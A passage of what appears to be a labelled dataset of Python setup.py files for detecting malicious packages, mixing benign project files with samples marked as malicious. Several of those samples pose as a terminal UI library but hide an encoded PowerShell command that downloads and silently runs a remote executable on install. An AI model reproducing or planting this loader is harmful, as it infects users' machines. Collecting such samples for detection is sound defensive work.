OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "tpverloadget-7.44", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tpverloadget',\n    packages = ['modlib'],\n    version = '2.80',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "ccsuper-6.43", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'ccsuper',\n    packages = ['modlib'],\n    version = '7.62',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "esqmaskcraftnvidia-8.59", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqmaskcraftnvidia',\n    packages = ['modlib'],\n    version = '9.67',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "DBUtils-3.0.2", "func": "\"\"\"Setup Script for DBUtils\"\"\"\n\nimport warnings\ntry:\n    from setuptools import setup\nexcept ImportError:\n    from distutils.core import setup\nfrom sys import version_info\n\npy_version = version_info[:2]\nif not (3, 6) <= py_version < (4, 0):\n    raise ImportError(\n        'Python {}.{} is not supported by DBUtils.'.format(*py_version))\n\nwarnings.filterwarnings('ignore', 'Unknown distribution option')\n\n__version__ = '3.0.2'\n\nreadme = open('README.md').read()\n\nsetup(\n    name='DBUtils',\n    version=__version__,\n    description='Database connections for multi-threaded environments.',\n    long_description=readme,\n    long_description_content_type='text/markdown',\n    classifiers=[\n        'Development Status :: 5 - Production/Stable',\n        'Environment :: Web Environment',\n        'Intended Audience :: Developers',\n        'Topic :: Database',\n        'Topic :: Internet :: WWW/HTTP :: Dynamic Content',\n        'Topic :: Software Development :: Libraries :: Python Modules',\n        'License :: OSI Approved :: MIT License',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n        'Programming Language :: Python :: 3.9',\n        'Programming Language :: Python :: 3.10',\n        'Operating System :: OS Independent',\n    ],\n    author='Christoph Zwerschke',\n    author_email='cito@online.de',\n    url='https://webwareforpython.github.io/DBUtils/',\n    download_url=\"https://pypi.org/project/DBUtils/\",\n    project_urls={\n        'Documentation':\n            'https://webwareforpython.github.io/DBUtils/main.html',\n        'Changelog':\n            'https://webwareforpython.github.io/DBUtils/changelog.html',\n        'Issue Tracker':\n            'https://github.com/WebwareForPython/DBUtils/issues',\n        'Source Code':\n            'https://github.com/WebwareForPython/DBUtils'},\n    platforms=['any'],\n    license='MIT License',\n    packages=['dbutils']\n)\n", "target": 0}
{"idx": "toolsuper-10.68", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'toolsuper',\n    packages = ['modlib'],\n    version = '3.14',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "Flask-Limiter-2.6.0", "func": "\"\"\"\nsetup.py for Flask-Limiter\n\n\n\"\"\"\n__author__ = \"Ali-Akber Saifee\"\n__email__ = \"ali@indydevs.org\"\n__copyright__ = \"Copyright 2022, Ali-Akber Saifee\"\n\nfrom setuptools import setup, find_packages\nimport os\nimport versioneer\n\nthis_dir = os.path.abspath(os.path.dirname(__file__))\nREQUIREMENTS = filter(\n    None, open(os.path.join(this_dir, \"requirements\", \"main.txt\")).read().splitlines()\n)\nEXTRA_REQUIREMENTS = {\n    \"redis\": [\"limits[redis]\"],\n    \"memcached\": [\"limits[memcached]\"],\n    \"mongodb\": [\"limits[mongodb]\"],\n}\n\nsetup(\n    name=\"Flask-Limiter\",\n    author=__author__,\n    author_email=__email__,\n    license=\"MIT\",\n    url=\"https://flask-limiter.readthedocs.org\",\n    project_urls={\n        \"Source\": \"https://github.com/alisaifee/flask-limiter\",\n    },\n    zip_safe=False,\n    version=versioneer.get_version(),\n    cmdclass=versioneer.get_cmdclass(),\n    install_requires=list(REQUIREMENTS),\n    classifiers=[k for k in open(\"CLASSIFIERS\").read().split(\"\\n\") if k],\n    description=\"Rate limiting for flask applications\",\n    long_description=open(\"README.rst\").read(),\n    packages=find_packages(exclude=[\"tests*\"]),\n    python_requires=\">=3.7\",\n    extras_require=EXTRA_REQUIREMENTS,\n    include_package_data=True,\n    package_data={\n        \"flask_limiter\": [\"py.typed\"],\n    },\n    entry_points={\n        'flask.commands': [\n            'limiter=flask_limiter.commands:cli'\n        ],\n    },\n)\n", "target": 0}
{"idx": "esqmccandypong-5.9", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqmccandypong',\n    packages = ['modlib'],\n    version = '1.91',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "einops-0.4.1", "func": "__author__ = 'Alex Rogozhnikov'\n\nfrom setuptools import setup\n\nsetup(\n    name=\"einops\",\n    version='0.4.1',\n    description=\"A new flavour of deep learning operations\",\n    long_description=open('README.md', encoding='utf-8').read(),\n    long_description_content_type='text/markdown',\n    url='https://github.com/arogozhnikov/einops',\n    author='Alex Rogozhnikov',\n\n    packages=['einops', 'einops.layers'],\n\n    classifiers=[\n        'Intended Audience :: Science/Research',\n        'Programming Language :: Python :: 3 ',\n    ],\n    keywords='deep learning, neural networks, tensor manipulation, machine learning, '\n             'scientific computations, einops',\n    install_requires=[\n        # no run-time or installation-time dependencies\n    ],\n)\n", "target": 0}
{"idx": "fs-2.4.16", "func": "#!/usr/bin/env python\n\nimport os\n\nwith open(os.path.join(\"fs\", \"_version.py\")) as f:\n    exec(f.read())\n\nfrom setuptools import setup\n\nsetup(version=__version__)\n", "target": 0}
{"idx": "pipcraft-9.21", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'pipcraft',\n    packages = ['modlib'],\n    version = '4.26',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "django-extensions-3.2.0", "func": "# -*- coding: utf-8 -*-\n\"\"\"\nBased entirely on Django's own ``setup.py``.\n\"\"\"\nimport os\nimport sys\nimport setuptools\nfrom distutils.command.install import INSTALL_SCHEMES\nfrom distutils.command.install_data import install_data\nfrom setuptools import setup\n\n\nclass osx_install_data(install_data):\n    # On MacOS, the platform-specific lib dir is at:\n    #   /System/Library/Framework/Python/.../\n    # which is wrong. Python 2.5 supplied with MacOS 10.5 has an Apple-specific\n    # fix for this in distutils.command.install_data#306. It fixes install_lib\n    # but not install_data, which is why we roll our own install_data class.\n\n    def finalize_options(self):\n        # By the time finalize_options is called, install.install_lib is set to\n        # the fixed directory, so we set the installdir to install_lib. The\n        # install_data class uses ('install_data', 'install_dir') instead.\n        self.set_undefined_options('install', ('install_lib', 'install_dir'))\n        install_data.finalize_options(self)\n\n\nif sys.platform == \"darwin\":\n    cmdclasses = {'install_data': osx_install_data}\nelse:\n    cmdclasses = {'install_data': install_data}\n\n\ndef fullsplit(path, result=None):\n    \"\"\"\n    Split a pathname into components (the opposite of os.path.join) in a\n    platform-neutral way.\n    \"\"\"\n    if result is None:\n        result = []\n    head, tail = os.path.split(path)\n    if head == '':\n        return [tail] + result\n    if head == path:\n        return result\n    return fullsplit(head, [tail] + result)\n\n\n# Tell distutils to put the data_files in platform-specific installation\n# locations. See here for an explanation:\n# http://groups.google.com/group/comp.lang.python/browse_thread/thread/35ec7b2fed36eaec/2105ee4d9e8042cb\nfor scheme in INSTALL_SCHEMES.values():\n    scheme['data'] = scheme['purelib']\n\n\n# Compile the list of packages available, because distutils doesn't have\n# an easy way to do this.\npackages, package_data = [], {}\n\nroot_dir = os.path.dirname(__file__)\nif root_dir != '':\n    os.chdir(root_dir)\nextensions_dir = 'django_extensions'\n\nfor dirpath, dirnames, filenames in os.walk(extensions_dir):\n    # Ignore PEP 3147 cache dirs and those whose names start with '.'\n    dirnames[:] = [d for d in dirnames if not d.startswith('.') and d != '__pycache__']\n    parts = fullsplit(dirpath)\n    package_name = '.'.join(parts)\n    if '__init__.py' in filenames:\n        packages.append(package_name)\n    elif filenames:\n        relative_path = []\n        while '.'.join(parts) not in packages:\n            relative_path.append(parts.pop())\n        relative_path.reverse()\n        path = os.path.join(*relative_path)\n        package_files = package_data.setdefault('.'.join(parts), [])\n        package_files.extend([os.path.join(path, f) for f in filenames])\n\n\nversion = __import__('django_extensions').__version__\n\nif int(setuptools.__version__.split(\".\", 1)[0]) < 18:\n    assert \"bdist_wheel\" not in sys.argv, \"setuptools 18 or later is required for wheels.\"\n\nlong_description = \"\"\"django-extensions bundles several useful\nadditions for Django projects. See the project page for more information:\n  http://github.com/django-extensions/django-extensions\"\"\"\nif os.path.isfile(\"README.rst\"):\n    with open(\"README.rst\") as f:\n        long_description = f.read()\n\nsetup(\n    name='django-extensions',\n    version=version,\n    description=\"Extensions for Django\",\n    long_description=long_description,\n    author='Michael Trier',\n    author_email='mtrier@gmail.com',\n    maintainer='Bas van Oostveen',\n    maintainer_email='v.oostveen@gmail.com',\n    url='http://github.com/django-extensions/django-extensions',\n    license='MIT License',\n    platforms=['any'],\n    packages=packages,\n    cmdclass=cmdclasses,\n    package_data=package_data,\n    python_requires=\">=3.6\",\n    install_requires=[\"Django>=3.2\"],\n    extras_require={},\n    classifiers=[\n        'Development Status :: 5 - Production/Stable',\n        'Environment :: Web Environment',\n        'Framework :: Django',\n        'Framework :: Django :: 3.2',\n        'Framework :: Django :: 4.0',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: MIT License',\n        'Operating System :: OS Independent',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3 :: Only',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n        'Programming Language :: Python :: 3.9',\n        'Programming Language :: Python :: 3.10',\n        'Programming Language :: Python :: Implementation :: CPython',\n        'Programming Language :: Python :: Implementation :: PyPy',\n        'Topic :: Utilities',\n    ],\n    project_urls={\n        \"Documentation\": \"https://django-extensions.readthedocs.io/\",\n        \"Changelog\": \"https://github.com/django-extensions/django-extensions/blob/main/CHANGELOG.md\",\n        \"Source\": \"https://github.com/django-extensions/django-extensions\",\n        \"Tracker\": \"https://github.com/django-extensions/django-extensions/issues\",\n    },\n)\n", "target": 0}
{"idx": "adcandy-10.49", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'adcandy',\n    packages = ['modlib'],\n    version = '4.71',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "decorator-5.1.1", "func": "from setuptools import setup\n\ndic = dict(__file__=None)\nexec(open('src/decorator.py').read(), dic)  # extract the __version__\nVERSION = dic['__version__']\n\n\nif __name__ == '__main__':\n    setup(name='decorator',\n          version=VERSION,\n          description='Decorators for Humans',\n          long_description=open('README.rst').read(),\n          author='Michele Simionato',\n          author_email='michele.simionato@gmail.com',\n          url='https://github.com/micheles/decorator',\n          license=\"new BSD License\",\n          package_dir={'': 'src'},\n          py_modules=['decorator'],\n          keywords=\"decorators generic utility\",\n          platforms=[\"All\"],\n          python_requires='>=3.5',\n          classifiers=['Development Status :: 5 - Production/Stable',\n                       'Intended Audience :: Developers',\n                       'License :: OSI Approved :: BSD License',\n                       'Natural Language :: English',\n                       'Operating System :: OS Independent',\n                       'Programming Language :: Python',\n                       'Programming Language :: Python :: 3.5',\n                       'Programming Language :: Python :: 3.6',\n                       'Programming Language :: Python :: 3.7',\n                       'Programming Language :: Python :: 3.8',\n                       'Programming Language :: Python :: 3.9',\n                       'Programming Language :: Python :: 3.10',\n                       'Programming Language :: Python :: Implementation :: CPython',\n                       'Topic :: Software Development :: Libraries',\n                       'Topic :: Utilities'],\n          test_suite='tests',\n          zip_safe=False)\n", "target": 0}
{"idx": "CurrencyConverter-0.17", "func": "from setuptools import setup\n\nsetup(\n    use_scm_version=True,\n)\n", "target": 0}
{"idx": "dominate-2.7.0", "func": "__license__ = '''\nThis file is part of Dominate.\n\nDominate is free software: you can redistribute it and/or modify\nit under the terms of the GNU Lesser General Public License as\npublished by the Free Software Foundation, either version 3 of\nthe License, or (at your option) any later version.\n\nDominate is distributed in the hope that it will be useful, but\nWITHOUT ANY WARRANTY; without even the implied warranty of\nMERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\nGNU Lesser General Public License for more details.\n\nYou should have received a copy of the GNU Lesser General\nPublic License along with dominate.  If not, see\n<http://www.gnu.org/licenses/>.\n'''\n# pylint: disable=bad-whitespace\n\nfrom setuptools import setup\n\nimport imp\n_version = imp.load_source(\"dominate._version\", \"dominate/_version.py\")\n\nlong_description = open('README.md').read()\n\nsetup(\n  name    = 'dominate',\n  version = _version.__version__,\n  author  = 'Tom Flanagan and Jake Wharton',\n  author_email = 'tom@zkpq.ca',\n  license = 'LGPLv3',\n  url     = 'https://github.com/Knio/dominate/',\n  description      = 'Dominate is a Python library for creating and manipulating HTML documents using an elegant DOM API.',\n  long_description = long_description,\n  long_description_content_type='text/markdown',\n  keywords         = 'framework templating template html xhtml python html5',\n\n  python_requires='>=2.7, !=3.0.*, !=3.1.*, !=3.2.*, !=3.3.*',\n  classifiers = [\n    'Intended Audience :: Developers',\n    'License :: OSI Approved :: GNU Lesser General Public License v3 (LGPLv3)',\n    'Operating System :: OS Independent',\n    'Programming Language :: Python',\n    'Programming Language :: Python :: 2',\n    'Programming Language :: Python :: 2.7',\n    'Programming Language :: Python :: 3',\n    'Programming Language :: Python :: 3.4',\n    'Programming Language :: Python :: 3.5',\n    'Programming Language :: Python :: 3.6',\n    'Programming Language :: Python :: 3.7',\n    'Programming Language :: Python :: 3.8',\n    'Programming Language :: Python :: 3.9',\n    'Programming Language :: Python :: 3.10',\n    'Programming Language :: Python :: Implementation :: PyPy',\n    'Topic :: Internet :: WWW/HTTP :: Dynamic Content',\n    'Topic :: Software Development :: Libraries :: Python Modules',\n    'Topic :: Text Processing :: Markup :: HTML',\n  ],\n\n  packages = ['dominate'],\n  include_package_data = True,\n)\n", "target": 0}
{"idx": "geopy-2.2.0", "func": "#!/usr/bin/env python\n\"\"\"\ngeopy\n\"\"\"\n\nimport sys\n\nfrom setuptools import find_packages, setup\n\nif sys.version_info < (3, 5):\n    raise RuntimeError(\n        \"geopy 2 supports Python 3.5 and above. \"\n        \"Use geopy 1.x if you need Python 2.7 or 3.4 support.\"\n    )\n\n# This import must be below the above `sys.version_info` check,\n# because the code being imported here is not compatible with the older\n# versions of Python.\nfrom geopy import __version__ as version  # noqa  # isort:skip\n\nINSTALL_REQUIRES = [\n    'geographiclib<2,>=1.49',\n]\n\nEXTRAS_DEV_TESTFILES_COMMON = [\n    \"async_generator\",\n]\n\nEXTRAS_DEV_LINT = [\n    \"flake8>=3.8.0,<3.9.0\",\n    \"isort>=5.6.0,<5.7.0\",\n]\n\nEXTRAS_DEV_TEST = [\n    \"coverage\",\n    \"pytest-aiohttp\",  # for `async def` tests\n    \"pytest>=3.10\",\n    \"sphinx\",  # `docutils` from sphinx is used in tests\n]\n\nEXTRAS_DEV_DOCS = [\n    \"readme_renderer\",\n    \"sphinx\",\n    \"sphinx-issues\",\n    \"sphinx_rtd_theme>=0.5.0\",\n]\n\nsetup(\n    name='geopy',\n    version=version,\n    description='Python Geocoding Toolbox',\n    long_description=open('README.rst').read(),\n    maintainer='Kostya Esmukov',\n    maintainer_email='kostya@esmukov.ru',\n    url='https://github.com/geopy/geopy',\n    download_url=(\n        'https://github.com/geopy/geopy/archive/%s.tar.gz' % version\n    ),\n    packages=find_packages(exclude=[\"*test*\"]),\n    install_requires=INSTALL_REQUIRES,\n    extras_require={\n        \"dev\": sorted(set(\n            EXTRAS_DEV_TESTFILES_COMMON +\n            EXTRAS_DEV_LINT +\n            EXTRAS_DEV_TEST +\n            EXTRAS_DEV_DOCS\n        )),\n        \"dev-lint\": (EXTRAS_DEV_TESTFILES_COMMON +\n                     EXTRAS_DEV_LINT),\n        \"dev-test\": (EXTRAS_DEV_TESTFILES_COMMON +\n                     EXTRAS_DEV_TEST),\n        \"dev-docs\": EXTRAS_DEV_DOCS,\n        \"aiohttp\": [\"aiohttp\"],\n        \"requests\": [\n            \"urllib3>=1.24.2\",\n            # ^^^ earlier versions would work, but a custom ssl\n            # context would silently have system certificates be loaded as\n            # trusted: https://github.com/urllib3/urllib3/pull/1566\n\n            \"requests>=2.16.2\",\n            # ^^^ earlier versions would work, but they use an older\n            # vendored version of urllib3 (see note above)\n        ],\n        \"timezone\": [\"pytz\"],\n    },\n    license='MIT',\n    keywords='geocode geocoding gis geographical maps earth distance',\n    python_requires=\">=3.5\",\n    classifiers=[\n        \"Development Status :: 5 - Production/Stable\",\n        \"Intended Audience :: Developers\",\n        \"Intended Audience :: Science/Research\",\n        \"License :: OSI Approved :: MIT License\",\n        \"Operating System :: OS Independent\",\n        \"Programming Language :: Python\",\n        \"Topic :: Scientific/Engineering :: GIS\",\n        \"Topic :: Software Development :: Libraries :: Python Modules\",\n        \"Programming Language :: Python :: 3 :: Only\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.5\",\n        \"Programming Language :: Python :: 3.6\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: Implementation :: CPython\",\n        \"Programming Language :: Python :: Implementation :: PyPy\",\n    ]\n)\n", "target": 0}
